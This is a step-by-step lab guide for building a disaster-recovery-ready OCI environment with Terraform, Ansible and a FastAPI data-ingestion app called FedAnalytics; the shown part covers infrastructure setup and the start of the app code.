# Federal Cloud Engineer Lab — Phase 2 Implementation Guide
## Disaster Recovery Drill & Backup Architecture on OCI

**Goal:** Build resilient infrastructure with immutable backups, deploy to Kubernetes, simulate a ransomware attack, and prove recovery within defined RTO/RPO — while learning webhook patterns and API Gateway concepts.
**Total Cost:** $0.00 (OCI Always Free tier)
**Primary Tool:** SSH Terminal + OCI Console
**Prerequisite:** Phase 1 completed (you understand Terraform, Ansible, FastAPI, Docker basics)

---

## WHAT YOU'RE BUILDING

Phase 1 taught you how to build and automate. Phase 2 teaches you how to survive when things break. You start by rebuilding a fresh environment fast (proving your Phase 1 skills are muscle memory), then layer on backup architecture, Kubernetes, and disaster recovery. Day 4 is the climax: you simulate a ransomware attack, detect it with AIDE, and recover everything within a measured RTO.

| Component | Phase 1 (End State) | Phase 2 (End State) |
|-----------|---------------------|---------------------|
| Infrastructure | Terraform (single VM + bastion) | Terraform (multi-node k3s cluster + DB) |
| Configuration | Ansible (hardening + deploy) | Ansible (hardening + deploy + drift detection) |
| Application | FedTracker (personnel tracker) | FedAnalytics (data ingestion + webhooks) |
| Database | Oracle Autonomous DB | Oracle Autonomous DB (with backup/restore drills) |
| Container Runtime | Podman/Docker on single VM | k3s Kubernetes (multi-node cluster) |
| Backup | Block volume snapshot | Immutable Object Storage + versioning + retention locks |
| Monitoring | Bash health check | AIDE file integrity + Python log correlator + cron automation |
| DR Capability | Manual destroy/rebuild (~15 min) | Full ransomware simulation with measured RTO/RPO |
| API Concepts | REST fundamentals (HTTP verbs, Pydantic, status codes) | Webhooks + OCI API Gateway + rate limiting |
| AI Integration | Ollama local inference | OCI Generative AI incident classification |
| CI/CD | Jenkins pipeline | Jenkins + scheduled backup validation + drift checks |

---

## ARCHITECTURE OVERVIEW

**Day 1 — Foundation (what you build today):**

```
Internet
    │
┌───▼──────────────────────────────────────────────────┐
│  OCI VCN: fedanalytics-vcn (10.0.0.0/16)             │
│                                                        │
│  ┌─────────────────────────────┐                      │
│  │ Public Subnet (10.0.1.0/24) │                      │
│  │  Bastion VM                 │                      │
│  │  (Oracle Linux 9, 1 OCPU)   │                      │
│  └──────────────┬──────────────┘                      │
│                 │ SSH tunnel                           │
│  ┌──────────────▼──────────────┐                      │
│  │ Private Subnet (10.0.2.0/24)│                      │
│  │  App Server VM              │                      │
│  │  (Oracle Linux 9, 1 OCPU)   │                      │
│  │  FedAnalytics (FastAPI)     │                      │
│  │  systemd managed            │                      │
│  └──────────────┬──────────────┘                      │
│                 │                                      │
│  ┌──────────────▼──────────────┐                      │
│  │ Oracle Autonomous DB         │                      │
│  │ (Always Free, 20 GB)        │                      │
│  └─────────────────────────────┘                      │
│                                                        │
│  OCI Object Storage: fedanalytics-backups              │
│  (versioning + retention locks)                        │
└────────────────────────────────────────────────────────┘
```

**Day 3-5 — Target Architecture (where you're headed):**

```
Internet
    │
┌───▼──────────────────────────────────────────────────────────┐
│  OCI VCN: fedanalytics-vcn (10.0.0.0/16)                     │
│                                                                │
│  ┌─────────────────────────────┐                              │
│  │ Public Subnet (10.0.1.0/24) │                              │
│  │  Bastion VM                 │                              │
│  └──────────────┬──────────────┘                              │
│                 │                                              │
│  ┌──────────────▼──────────────────────────────────────┐      │
│  │ Private Subnet (10.0.2.0/24)                         │      │
│  │                                                       │      │
│  │  ┌──────────────────┐    ┌──────────────────┐        │      │
│  │  │  k3s Server       │    │  k3s Agent        │        │      │
│  │  │  (Node 1)         │◄──▶│  (Node 2)         │        │      │
│  │  │  2 OCPU / 12 GB   │    │  2 OCPU / 12 GB   │        │      │
│  │  │                   │    │                   │        │      │
│  │  │  ┌─────────────┐ │    │  ┌─────────────┐ │        │      │
│  │  │  │FedAnalytics │ │    │  │FedAnalytics │ │        │      │
│  │  │  │  Pod (1)     │ │    │  │  Pod (2)     │ │        │      │
│  │  │  └─────────────┘ │    │  └─────────────┘ │        │      │
│  │  │  AIDE monitoring  │    │  AIDE monitoring  │        │      │
│  │  │  Log correlator   │    │                   │        │      │
│  │  │  Backup cron jobs │    │                   │        │      │
│  │  └──────────────────┘    └──────────────────┘        │      │
│  └───────────────────────────────────────────────────────┘      │
│                 │                                                │
│  ┌──────────────▼──────────────┐                                │
│  │ Oracle Autonomous DB         │                                │
│  │ (Always Free, 20 GB)        │                                │
│  └─────────────────────────────┘                                │
│                                                                  │
│  OCI Object Storage: fedanalytics-backups                        │
│  ├── db-exports/ (versioned, retention-locked)                   │
│  ├── config-snapshots/ (versioned)                               │
│  └── aide-baselines/ (versioned)                                 │
│                                                                  │
│  OCI Generative AI Service (incident classification)             │
└──────────────────────────────────────────────────────────────────┘
```

> **Why a fresh environment?** Phase 2 is a separate project with a separate app (FedAnalytics, not FedTracker). Starting fresh proves you can build environments from scratch — not just modify existing ones. In interviews, you'll say "I built two complete environments from code, not just one."

---

## WHERE AM I? — LOCATION GUIDE

Watch for these location tags throughout the guide. They tell you exactly where to type each command.

| Tag | Where | What It Looks Like |
|-----|-------|-------------------|
| 📍 **OCI Console** | Oracle Cloud web UI | cloud.oracle.com — clicking buttons, navigating menus |
| 📍 **Local Terminal** | Your machine's terminal | WSL2 on your laptop |
| 📍 **VM Terminal** | SSH into Oracle Linux VM | `ssh opc@<public_ip>` — commands run on the cloud server |
| 📍 **Editor** | Your text editor | VS Code, nano, vim — editing files |
| 📍 **Browser** | Web browser | Testing endpoints, viewing Swagger docs |

---

# DAY 1: BUILD THE ENVIRONMENT FAST (~6-8 hrs)

> Day 1 is a speed run. You already know Terraform and Ansible from Phase 1, so the guidance is abbreviated — commands and configs are provided, but you won't get full ELI5 on returning concepts. New concepts (Object Storage versioning, retention locks, lifecycle policies) get full treatment. By end of day, you have a running FedAnalytics app with immutable backup infrastructure.

---

### Pre-Phase 2: Verify Phase 1 Cleanup

Before starting Phase 2, verify all Phase 1 resources are terminated to stay within Always Free limits:

```bash
# Check current compute usage
# First, set your compartment OCID (find it in OCI Console → Identity → Compartments)
export COMPARTMENT_ID="<YOUR_COMPARTMENT_OCID>"

oci compute instance list --compartment-id $COMPARTMENT_ID --lifecycle-state RUNNING --query 'data[].{Name:"display-name", Shape:shape, OCPUs:"shape-config".ocpus, Memory:"shape-config"."memory-in-gbs"}' --output table

# You should see NO running instances. If Phase 1 instances exist:
oci compute instance terminate --instance-id <INSTANCE_OCID> --force
```

> **Always Free Limits:** 4 OCPUs and 24 GB RAM total across all A1 instances. Phase 2 needs 2 OCPU/12GB minimum. If Phase 1 resources are still running, you'll hit capacity errors.

---

## PHASE 20: FRESH OCI ENVIRONMENT VIA TERRAFORM (1.5 hrs)

> You're building a new OCI environment from scratch using Terraform. This is a returning concept from Phase 1 — you know how providers, resources, and variables work. The guidance here is abbreviated: configs are provided with inline comments, but the deep ELI5 explanations are skipped. If anything looks unfamiliar, refer back to Phase 1 Phases 10-12.
>
> 📍 **Where work happens:** Local Terminal, Editor, OCI Console.
>
> 🛠️ **Build approach:** Terraform files built by hand (returning — abbreviated guidance). You already know how to write `.tf` files.

---

### Step 20.1 — Create Project Structure
📍 **Local Terminal**

```bash
mkdir -p ~/oci-federal-lab-phase2/{terraform,ansible/{playbooks,templates},app,scripts,docs,k8s}
cd ~/oci-federal-lab-phase2
git init
```

Create `.gitignore`:

📍 **Editor** (build by hand)

```bash
cat > ~/oci-federal-lab-phase2/.gitignore << 'EOF'
# Terraform
*.tfstate
*.tfstate.backup
.terraform/
.terraform.lock.hcl
terraform.tfvars

# SSH keys
*.key
*.pem

# Oracle wallet
wallet/
Wallet_*.zip

# Python
__pycache__/
*.pyc
.venv/

# OS
.DS_Store
Thumbs.db

# Secrets
.env
*.secret
EOF
```

**Verify:**

```bash
ls ~/oci-federal-lab-phase2/
# Expected: terraform/ ansible/ app/ scripts/ docs/ k8s/ .gitignore
```

---

### Step 20.2 — Create Terraform Configuration
📍 **Editor** (build by hand — returning concept, abbreviated)

> This is the same pattern as Phase 1 Phase 10-12. You're creating provider, variables, network, compute, database, and outputs files. The key differences: new compartment name (`fedanalytics-lab`), new VCN name, and the app server gets more resources for k3s later.

**Build `terraform/provider.tf`:**

```bash
cat > ~/oci-federal-lab-phase2/terraform/provider.tf << 'EOF'
# OCI Terraform Provider configuration
# Returning concept from Phase 1 — credentials via variables, never hardcoded

terraform {
  required_providers {
    oci = {
      source  = "oracle/oci"
      version = "~> 5.0"
    }
  }
  required_version = ">= 1.5.0"
}

provider "oci" {
  tenancy_ocid     = var.tenancy_ocid
  user_ocid        = var.user_ocid
  fingerprint      = var.fingerprint
  private_key_path = var.private_key_path
  region           = var.region
}
EOF
```

**Build `terraform/variables.tf`:**

```bash
cat > ~/oci-federal-lab-phase2/terraform/variables.tf << 'EOF'
# --- OCI Authentication ---
variable "tenancy_ocid" {
  description = "OCI tenancy OCID"
  type        = string
}

variable "user_ocid" {
  description = "OCI user OCID"
  type        = string
}

variable "fingerprint" {
  description = "API key fingerprint"
  type        = string
}

variable "private_key_path" {
  description = "Path to OCI API private key"
  type        = string
}

variable "region" {
  description = "OCI region (e.g., us-ashburn-1)"
  type        = string
}

variable "compartment_ocid" {
  description = "Compartment OCID for all resources"
  type        = string
}

# --- Compute ---
variable "availability_domain" {
  description = "Availability domain name"
  type        = string
}

variable "ssh_public_key" {
  description = "SSH public key for VM access"
  type        = string
}

variable "image_ocid" {
  description = "Oracle Linux 9 ARM image OCID"
  type        = string
}

# --- Database ---
variable "db_admin_password" {
  description = "Oracle Autonomous DB admin password"
  type        = string
  sensitive   = true
}

variable "db_wallet_password" {
  description = "Oracle Autonomous DB wallet password"
  type        = string
  sensitive   = true
}
EOF
```

**Build `terraform/network.tf`:**

```bash
cat > ~/oci-federal-lab-phase2/terraform/network.tf << 'EOF'
# --- VCN and Networking ---
# Same pattern as Phase 1: VCN with public subnet (bastion) and private subnet (app)

resource "oci_core_vcn" "fedanalytics_vcn" {
  compartment_id = var.compartment_ocid
  display_name   = "fedanalytics-vcn"
  cidr_blocks    = ["10.0.0.0/16"]
  dns_label      = "fedanalytics"

  freeform_tags = {
    "Project"     = "fedanalytics"
    "Environment" = "lab"
    "Phase"       = "phase-2"
    "Owner"       = "<YOUR_NAME>"
    "CostCenter"  = "interview-prep"
  }
}

# Internet Gateway — allows public subnet to reach the internet
resource "oci_core_internet_gateway" "igw" {
  compartment_id = var.compartment_ocid
  vcn_id         = oci_core_vcn.fedanalytics_vcn.id
  display_name   = "fedanalytics-igw"
  enabled        = true
}

# NAT Gateway — allows private subnet outbound internet (no inbound)
resource "oci_core_nat_gateway" "natgw" {
  compartment_id = var.compartment_ocid
  vcn_id         = oci_core_vcn.fedanalytics_vcn.id
  display_name   = "fedanalytics-natgw"
}

# Public route table — routes internet traffic through IGW
resource "oci_core_route_table" "public_rt" {
  compartment_id = var.compartment_ocid
  vcn_id         = oci_core_vcn.fedanalytics_vcn.id
  display_name   = "public-rt"

  route_rules {
    destination       = "0.0.0.0/0"
    network_entity_id = oci_core_internet_gateway.igw.id
  }
}

# Private route table — routes outbound through NAT GW
resource "oci_core_route_table" "private_rt" {
  compartment_id = var.compartment_ocid
  vcn_id         = oci_core_vcn.fedanalytics_vcn.id
  display_name   = "private-rt"

  route_rules {
    destination       = "0.0.0.0/0"
    network_entity_id = oci_core_nat_gateway.natgw.id
  }
}

# Public security list — allows SSH from anywhere (bastion access)
resource "oci_core_security_list" "public_sl" {
  compartment_id = var.compartment_ocid
  vcn_id         = oci_core_vcn.fedanalytics_vcn.id
  display_name   = "public-sl"

  # Allow SSH inbound
  ingress_security_rules {
    protocol = "6"  # TCP
    source   = "0.0.0.0/0"
    tcp_options {
      min = 22
      max = 22
    }
  }

  # Allow all outbound
  egress_security_rules {
    protocol    = "all"
    destination = "0.0.0.0/0"
  }
}

# Private security list — allows SSH from public subnet, app traffic
resource "oci_core_security_list" "private_sl" {
  compartment_id = var.compartment_ocid
  vcn_id         = oci_core_vcn.fedanalytics_vcn.id
  display_name   = "private-sl"

  # Allow SSH from public subnet (bastion)
  ingress_security_rules {
    protocol = "6"
    source   = "10.0.1.0/24"
    tcp_options {
      min = 22
      max = 22
    }
  }

  # Allow app traffic (port 8000) from public subnet
  ingress_security_rules {
    protocol = "6"
    source   = "10.0.1.0/24"
    tcp_options {
      min = 8000
      max = 8000
    }
  }

  # Allow k3s API server (port 6443) within private subnet
  ingress_security_rules {
    protocol = "6"
    source   = "10.0.2.0/24"
    tcp_options {
      min = 6443
      max = 6443
    }
  }

  # Allow Flannel VXLAN (port 8472 UDP) for k3s overlay networking
  ingress_security_rules {
    protocol = "17"  # UDP
    source   = "10.0.2.0/24"
    udp_options {
      min = 8472
      max = 8472
    }
  }

  # Allow kubelet (port 10250) within private subnet
  ingress_security_rules {
    protocol = "6"
    source   = "10.0.2.0/24"
    tcp_options {
      min = 10250
      max = 10250
    }
  }

  # Allow NodePort range (30000-32767) from public subnet
  ingress_security_rules {
    protocol = "6"
    source   = "10.0.1.0/24"
    tcp_options {
      min = 30000
      max = 32767
    }
  }

  # Allow all traffic within private subnet (pod-to-pod)
  ingress_security_rules {
    protocol = "all"
    source   = "10.0.2.0/24"
  }

  # Allow all outbound
  egress_security_rules {
    protocol    = "all"
    destination = "0.0.0.0/0"
  }
}

# Public subnet (bastion)
resource "oci_core_subnet" "public_subnet" {
  compartment_id    = var.compartment_ocid
  vcn_id            = oci_core_vcn.fedanalytics_vcn.id
  display_name      = "public-subnet"
  cidr_block        = "10.0.1.0/24"
  route_table_id    = oci_core_route_table.public_rt.id
  security_list_ids = [oci_core_security_list.public_sl.id]
  dns_label         = "pub"
}

# Private subnet (app servers / k3s nodes)
resource "oci_core_subnet" "private_subnet" {
  compartment_id             = var.compartment_ocid
  vcn_id                     = oci_core_vcn.fedanalytics_vcn.id
  display_name               = "private-subnet"
  cidr_block                 = "10.0.2.0/24"
  route_table_id             = oci_core_route_table.private_rt.id
  security_list_ids          = [oci_core_security_list.private_sl.id]
  dns_label                  = "priv"
  prohibit_public_ip_on_vnic = true
}
EOF
```

> **What's different from Phase 1?** The security list now includes k3s ports (6443 for the API server, 8472 UDP for Flannel VXLAN overlay, 10250 for kubelet, 30000-32767 for NodePort services). These are pre-configured so Day 3's k3s setup works without firewall debugging. In Phase 1, you added ports reactively — this time you plan ahead.

**Build `terraform/compute.tf`:**

```bash
cat > ~/oci-federal-lab-phase2/terraform/compute.tf << 'EOF'
# --- Compute Instances ---
# Day 1: bastion (1 OCPU/6GB) + app-server (1 OCPU/6GB) = 2 OCPU/12GB
# Day 3: resize app-server OR add k3s nodes (up to 4 OCPU/24GB free tier limit)

resource "oci_core_instance" "bastion" {
  compartment_id      = var.compartment_ocid
  availability_domain = var.availability_domain
  display_name        = "bastion"
  shape               = "VM.Standard.A1.Flex"

  shape_config {
    ocpus         = 1
    memory_in_gbs = 6
  }

  source_details {
    source_type = "image"
    source_id   = var.image_ocid
  }

  create_vnic_details {
    subnet_id        = oci_core_subnet.public_subnet.id
    assign_public_ip = true
  }

  metadata = {
    ssh_authorized_keys = var.ssh_public_key
  }

  freeform_tags = {
    "Project"     = "fedanalytics"
    "Environment" = "lab"
    "Phase"       = "phase-2"
    "Role"        = "bastion"
  }
}

resource "oci_core_instance" "app_server" {
  compartment_id      = var.compartment_ocid
  availability_domain = var.availability_domain
  display_name        = "app-server"
  shape               = "VM.Standard.A1.Flex"

  shape_config {
    ocpus         = 1
    memory_in_gbs = 6
  }

  source_details {
    source_type = "image"
    source_id   = var.image_ocid
  }

  create_vnic_details {
    subnet_id        = oci_core_subnet.private_subnet.id
    assign_public_ip = false
  }

  metadata = {
    ssh_authorized_keys = var.ssh_public_key
  }

  freeform_tags = {
    "Project"     = "fedanalytics"
    "Environment" = "lab"
    "Phase"       = "phase-2"
    "Role"        = "app-server"
  }
}
EOF
```

> **Why 1 OCPU / 6 GB each for now?** Day 3 adds two k3s nodes at 2 OCPU / 12 GB each. OCI Always Free gives 4 OCPU / 24 GB total for A1 Flex. Day 1-2 uses bastion (1/6) + app-server (1/6) = 2 OCPU / 12 GB. Day 3 replaces the app-server with two k3s nodes (2/12 each) = 4 OCPU / 24 GB. Budget managed across the phase.

**Build `terraform/database.tf`:**

```bash
cat > ~/oci-federal-lab-phase2/terraform/database.tf << 'EOF'
# --- Oracle Autonomous Database ---
# Same Always Free database as Phase 1 — returning concept

resource "oci_database_autonomous_database" "fedanalytics_db" {
  compartment_id           = var.compartment_ocid
  display_name             = "fedanalytics-db"
  db_name                  = "fedanalyticsdb"
  db_workload              = "OLTP"
  is_free_tier             = true
  compute_count            = 1    # Replaces deprecated cpu_core_count in provider v5.x+
  data_storage_size_in_gbs = 20   # Always Free tier provides 20 GB (not 1 TB)
  admin_password           = var.db_admin_password

  freeform_tags = {
    "Project"     = "fedanalytics-lab"
    "Environment" = "lab"
  }
}
EOF
```

> **Cost check:** Autonomous Database with `is_free_tier = true` = $0.00/month. 1 OCPU + 20 GB storage included. If you still have the Phase 1 database running, terminate it first — you only get one Always Free ADB per tenancy.

**Build `terraform/outputs.tf`:**

```bash
cat > ~/oci-federal-lab-phase2/terraform/outputs.tf << 'EOF'
output "bastion_public_ip" {
  description = "Bastion public IP for SSH access"
  value       = oci_core_instance.bastion.public_ip
}

output "app_server_private_ip" {
  description = "App server private IP"
  value       = oci_core_instance.app_server.private_ip
}

output "vcn_id" {
  description = "VCN OCID"
  value       = oci_core_vcn.fedanalytics_vcn.id
}

output "private_subnet_id" {
  description = "Private subnet OCID (for adding k3s nodes later)"
  value       = oci_core_subnet.private_subnet.id
}

output "db_connection_strings" {
  description = "Autonomous DB connection strings"
  value       = oci_database_autonomous_database.fedanalytics_db.connection_strings
}
EOF
```

**Create `terraform/terraform.tfvars`:**

📍 **Editor**

```bash
cat > ~/oci-federal-lab-phase2/terraform/terraform.tfvars << 'EOF'
# FILL THESE IN with your OCI values
# (same values you used in Phase 1 — check ~/.oci/config)

tenancy_ocid     = "ocid1.tenancy.oc1..YOUR_TENANCY"
user_ocid        = "ocid1.user.oc1..YOUR_USER"
fingerprint      = "xx:xx:xx:xx:YOUR_FINGERPRINT"
private_key_path = "~/.oci/oci_api_key.pem"
region           = "us-ashburn-1"

compartment_ocid    = "ocid1.compartment.oc1..YOUR_COMPARTMENT"
availability_domain = "YOUR_AD_NAME"
ssh_public_key      = "ssh-rsa YOUR_PUBLIC_KEY"
image_ocid          = "ocid1.image.oc1..YOUR_OL9_ARM_IMAGE"

db_admin_password  = "YourStr0ngP@ssw0rd!"
db_wallet_password = "W@lletP@ss123!"
EOF
```

> **Important:** Fill in the actual values from your OCI account. You can find most of these in `~/.oci/config` and the OCI Console. The `image_ocid` is the Oracle Linux 9 ARM image for your region — find it under **Compute** → **Custom Images** or the [OCI image list](https://docs.oracle.com/en-us/iaas/images/).

---

### Step 20.3 — Deploy Infrastructure
📍 **Local Terminal**

```bash
cd ~/oci-federal-lab-phase2/terraform

# Initialize Terraform (download OCI provider)
terraform init
# Expected: "Terraform has been successfully initialized!"

# Preview what will be created
terraform plan
# Expected: Plan shows ~10 resources to create (VCN, subnets, gateways, route tables, security lists, instances, ADB)

# Apply — create everything
terraform apply
# Type "yes"
# Expected: "Apply complete! Resources: X added"
```

> **Cost check:** All resources are within OCI Always Free tier. 2 A1 Flex instances (2 OCPU / 12 GB total), 1 ADB, VCN components. $0.00/month. Verify at: [oracle.com/cloud/free](https://www.oracle.com/cloud/free/)

```bash
# Save the outputs — you'll need these for SSH and Ansible
terraform output
# Note the bastion_public_ip and app_server_private_ip
```

**Set up SSH config:**

```bash
BASTION_IP=$(terraform output -raw bastion_public_ip)
APP_IP=$(terraform output -raw app_server_private_ip)

cat >> ~/.ssh/config << SSHEOF

Host bastion-p2
    HostName ${BASTION_IP}
    User opc
    IdentityFile ~/.ssh/oci_key

Host app-server-p2
    HostName ${APP_IP}
    User opc
    IdentityFile ~/.ssh/oci_key
    ProxyJump bastion-p2
SSHEOF
```

> **Why `-p2` suffix?** If you still have Phase 1 SSH config entries, the `-p2` suffix prevents conflicts. You can use `ssh app-server-p2` to connect to this Phase 2 environment.

```bash
# Test SSH connectivity
ssh bastion-p2 "hostname && echo 'Bastion OK'"
# Expected: bastion hostname printed

ssh app-server-p2 "hostname && echo 'App Server OK'"
# Expected: app-server hostname printed (via bastion ProxyJump)
```

<sub><em style="color: #999; font-size: 0.65em;">

💡🖥️ Commands used:

| Command | Flag(s) | What It Does |
|---------|---------|-------------|
| `terraform init` | | Download providers, initialize working directory |
| `terraform plan` | | Preview changes without applying. Auto-loads `terraform.tfvars` |
| `terraform apply` | | Create/update infrastructure. Auto-loads `terraform.tfvars`. Use `-var-file` only for non-default filenames like `prod.tfvars` |
| `terraform output` | `-raw` | Show output values. `-raw` strips quotes for scripting |

</em></sub>

**Verify:**

```bash
# Verify all resources exist
terraform state list
# Expected: oci_core_vcn, oci_core_subnet (x2), oci_core_instance (x2), oci_database_autonomous_database, etc.
```

---

### Phase 20 Troubleshooting

| Check | Expected | If It Fails |
|-------|----------|-------------|
| `terraform init` succeeds | Provider downloaded | Check internet connection. Verify provider version constraint in provider.tf |
| `terraform plan` shows resources | ~10 resources to add | Authentication error → check terraform.tfvars values match ~/.oci/config. Wrong compartment → verify compartment OCID |
| `terraform apply` completes | All resources created | A1 Flex "out of capacity" → try different availability domain. ADB "limit reached" → terminate Phase 1 ADB first |
| SSH to bastion works | Shell prompt | Security list missing SSH rule? Check public_sl allows port 22 from 0.0.0.0/0 |
| SSH to app-server works | Shell prompt via ProxyJump | Check private_sl allows port 22 from 10.0.1.0/24. Verify ProxyJump config |

---

## PHASE 21: DEPLOY FEDANALYTICS VIA ANSIBLE (2.5 hrs)

> You're deploying a new FastAPI application — FedAnalytics — using Ansible. Ansible is a returning concept, but the application is new. FedAnalytics is a data ingestion service with webhook support (the Phase 2 API Pillar concept). You'll build the app section-by-section just like FedTracker in Phase 1, but spend less time on Pydantic/status codes (returning) and more time on webhooks and metrics (new).
>
> 📍 **Where work happens:** Editor (app code), Local Terminal (Ansible), VM Terminal (verification).
>
> 🛠️ **Build approach:** FastAPI app built section-by-section (NOT copy-paste). Ansible playbook built by hand (returning — abbreviated). Webhook endpoint gets full ELI5 treatment.

---

### Step 21.1 — Install Ansible (if not already installed)
📍 **WSL2 Terminal** (Windows) / **Local Terminal** (macOS/Linux)

> **Prerequisite:** Ansible must be installed on your local machine (the "control node"). If you installed it in Phase 1, skip to Step 21.2.

```bash
# macOS
brew install ansible

# Linux
python3 -m pip install ansible

# Verify
ansible --version
# Expected: ansible [core 2.x.x]
```

> **Windows users:** Ansible does **not** run natively on Windows. Install WSL2 first (`wsl --install` in PowerShell as admin), then install Ansible inside WSL2 with `pip install ansible`. Run all commands from WSL2 — Ansible does not work in PowerShell or Git Bash. VS Code's WSL extension lets you open a WSL2 terminal directly inside VS Code.

---

### Step 21.2 — Create Ansible Inventory
📍 **Editor** (build by hand — returning, abbreviated)

```bash
cat > ~/oci-federal-lab-phase2/ansible/inventory.ini << 'EOF'
# Ansible inventory for Phase 2
# Update IPs after terraform apply

[bastion]
bastion-p2 ansible_host=<BASTION_PUBLIC_IP> ansible_user=opc ansible_ssh_private_key_file=~/.ssh/oci_key

[app]
app-server-p2 ansible_host=<APP_SERVER_PRIVATE_IP> ansible_user=opc ansible_ssh_private_key_file=~/.ssh/oci_key ansible_ssh_common_args='-o ProxyJump=opc@<BASTION_PUBLIC_IP>'

[all:vars]
ansible_python_interpreter=/usr/bin/python3
EOF
```

> **Important:** Replace `<BASTION_PUBLIC_IP>` and `<APP_SERVER_PRIVATE_IP>` with the actual IPs from `terraform output`.

**Verify:**

```bash
cd ~/oci-federal-lab-phase2
ansible all -i ansible/inventory.ini -m ping
# Expected: app-server-p2 | SUCCESS
```

---

### Step 21.2 — Build FedAnalytics Section by Section
📍 **Editor** (build by hand)

> **🧠 ELI5 — What is FedAnalytics?** FedAnalytics is a federal data ingestion and monitoring service. Unlike FedTracker (which tracked personnel records), FedAnalytics ingests CSV data batches, monitors pipeline health, collects logs with severity filtering, and — crucially — listens for webhook notifications from OCI Events. Every endpoint serves a purpose in the DR scenario: `/ingest` feeds data, `/logs` helps during incident investigation, `/metrics` tracks pipeline health, and `/webhook` receives automated alerts when cloud events occur.

**Build `app/main.py` section by section:**

**Step 1: Imports and app creation**

```bash
cat > ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'
#!/usr/bin/env python3
"""
FedAnalytics — Federal Data Ingestion & Monitoring Service
A FastAPI app demonstrating webhook patterns, metrics collection, and log analysis.

Phase 2 API Pillar: Webhooks (POST /webhook receives OCI Events notifications)
Database: Oracle Autonomous DB
Server: uvicorn (ASGI) on port 8000
"""

import os
import csv
import io
import json
import hmac
import hashlib
import logging
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from typing import Optional, List, Dict, Any

from fastapi import FastAPI, HTTPException, Query, Request, Header
from pydantic import BaseModel, Field


# --- Lifespan (startup/shutdown) ---
# Replaces deprecated @app.on_event("startup") pattern (deprecated in FastAPI 0.95+).
# init_db() and seed_data() are defined later but won't be called until app starts.
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Initialize database and seed data on startup."""
    init_db()
    log_app("INFO", "startup", "FedAnalytics service started")
    # Seed sample data if empty
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM ingest_data")
    if cursor.fetchone()[0] == 0:
        import uuid
        batch_id = "seed-" + str(uuid.uuid4())[:4]
        sample_records = [
            (batch_id, "2026-03-20T08:00:00Z", "firewall-01", "logs", "access", "INFO",
             "Allowed TCP 10.0.1.5:443 -> 10.0.2.10:8000", None),
            (batch_id, "2026-03-20T08:01:00Z", "firewall-01", "logs", "access", "WARNING",
             "Denied TCP 192.168.1.100:22 -> 10.0.2.10:22 (unauthorized source)", None),
            (batch_id, "2026-03-20T08:05:00Z", "app-server", "logs", "audit", "INFO",
             "User admin performed database backup", '{"action": "backup", "target": "fedanalyticsdb"}'),
            (batch_id, "2026-03-20T08:10:00Z", "ids-sensor", "logs", "security", "ERROR",
             "Suspicious port scan detected from 203.0.113.50", '{"source_ip": "203.0.113.50", "ports_scanned": 1024}'),
            (batch_id, "2026-03-20T08:15:00Z", "app-server", "logs", "metric", "INFO",
             "CPU usage at 45%, memory at 62%", '{"cpu": 45, "memory": 62}'),
        ]
        cursor.executemany(
            """INSERT INTO ingest_data
               (batch_id, timestamp, source, data_type, category, severity, message, metadata)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            sample_records
        )
        METRICS["records_ingested"] = len(sample_records)
        log_app("INFO", "seed", f"Seeded {len(sample_records)} sample records")
        log_audit("SEED_DATA", "ingest_data", details=f"Loaded {len(sample_records)} sample records")
        conn.commit()
    conn.close()
    yield
    log_app("INFO", "shutdown", "FedAnalytics service shutting down")


# Create the FastAPI application instance
app = FastAPI(
    title="FedAnalytics",
    description="Federal Data Ingestion & Monitoring API — DR-ready with webhook support",
    version="2.0.0",
    lifespan=lifespan
)
APPEOF
```

> **What's different from FedTracker?** New imports: `hmac` and `hashlib` for webhook signature validation, `Request` for raw request body access, `Header` for reading HTTP headers. These support the webhook endpoint — you'll see why shortly.

**Step 2: Configuration**

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'

# --- Configuration ---
DB_TYPE = os.environ.get("DB_TYPE", "sqlite")
SQLITE_PATH = os.environ.get("SQLITE_PATH", "/opt/fedanalytics/fedanalytics.db")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "change-me-in-production")

# In-memory metrics (reset on restart — production would use Prometheus)
METRICS = {
    "records_ingested": 0,
    "ingest_errors": 0,
    "webhooks_received": 0,
    "webhooks_validated": 0,
    "webhooks_rejected": 0,
    "last_ingest_time": None,
    "start_time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
}
APPEOF
```

> **Why in-memory metrics?** For this lab, storing metrics in a Python dict is simple and sufficient. Production systems use Prometheus or similar, but the pattern is the same: increment counters on events, expose them via an endpoint. The metrics reset when the app restarts — that's fine for learning. Day 4's DR drill will show what happens when metrics disappear (motivation for persistent monitoring).

**Step 3: Pydantic models** — data shapes for ingestion and webhooks

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


# --- Pydantic Models ---
# Returning concept: Pydantic validates incoming data automatically.
# New models for data ingestion (not personnel records).

class IngestRecord(BaseModel):
    """A single record in an ingest batch."""
    timestamp: str = Field(..., description="ISO 8601 timestamp of the record")
    source: str = Field(..., min_length=1, description="Data source identifier")
    category: str = Field(..., description="Record category (access, error, audit, metric)")
    severity: str = Field(default="INFO", description="Severity level (DEBUG, INFO, WARNING, ERROR, CRITICAL)")
    message: str = Field(..., min_length=1, description="Record content/message")
    metadata: Optional[Dict[str, Any]] = Field(default=None, description="Additional key-value metadata")

class IngestRequest(BaseModel):
    """Batch ingestion request — multiple records in one POST."""
    source: str = Field(..., min_length=1, description="Name of the sending system")
    data_type: str = Field(..., description="Type of data being ingested (logs, metrics, events)")
    records: List[IngestRecord] = Field(..., min_length=1, description="List of records to ingest")

class IngestResponse(BaseModel):
    """Response after successful ingestion."""
    status: str
    records_accepted: int
    records_rejected: int
    batch_id: str
    timestamp: str

class WebhookEvent(BaseModel):
    """OCI Events webhook payload structure."""
    eventType: str = Field(..., description="OCI event type (e.g., com.oraclecloud.objectstorage.createobject)")
    cloudEventsVersion: Optional[str] = Field(default="0.1", description="CloudEvents spec version")
    source: str = Field(..., description="Source service (e.g., ObjectStorage)")
    eventTime: str = Field(..., description="When the event occurred")
    data: Optional[Dict[str, Any]] = Field(default=None, description="Event-specific payload")
APPEOF
```

